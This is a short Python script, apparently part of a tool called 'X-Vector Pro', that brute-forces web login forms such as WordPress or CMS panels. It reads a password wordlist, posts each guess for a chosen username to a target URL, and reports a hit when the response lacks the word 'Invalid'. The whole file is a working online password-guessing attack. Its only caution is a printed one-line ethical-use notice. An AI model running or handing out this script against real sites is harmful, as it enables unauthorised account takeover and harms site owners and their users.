"""
Brute Force Login Exploit

Description:
Attempts to guess login credentials using a wordlist on a specified target.
Supports POST-based login forms (e.g., WordPress, CMS, panels).

Author: X-Vector Pro
"""

import argparse
import requests
import time

def brute_force(target_url, username, wordlist_path, delay=0.5):
    try:
        with open(wordlist_path, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[!] Failed to read wordlist: {e}")
        return

    print(f"[+] Target URL: {target_url}")
    print(f"[+] Username: {username}")
    print(f"[+] Loaded {len(passwords)} passwords from {wordlist_path}")

    for i, password in enumerate(passwords, 1):
        payload = {
            "username": username,
            "password": password
        }

        try:
            response = requests.post(target_url, data=payload, timeout=8)
            if "Invalid" not in response.text and response.status_code == 200:
                print(f"[SUCCESS] Password found: {password}")
                return
            else:
                print(f"[{i}/{len(passwords)}] Attempt failed: {password}")
        except requests.RequestException as e:
            print(f"[ERROR] Connection error: {e}")

        time.sleep(delay)

    print("[!] Brute-force complete. No valid password found.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Brute Force Login Exploit")
    parser.add_argument("--target", required=True, help="Login URL (POST endpoint)")
    parser.add_argument("--username", required=True, help="Username to brute-force")
    parser.add_argument("--wordlist", required=True, help="Path to wordlist file")
    parser.add_argument("--delay", type=float, default=0.5, help="Delay between attempts (seconds)")
    args = parser.parse_args()

    print("=== Ethical Use Notice ===")
    print("Do not use on unauthorized systems.")
    print("==========================")

    brute_force(args.target, args.username, args.wordlist, args.delay)
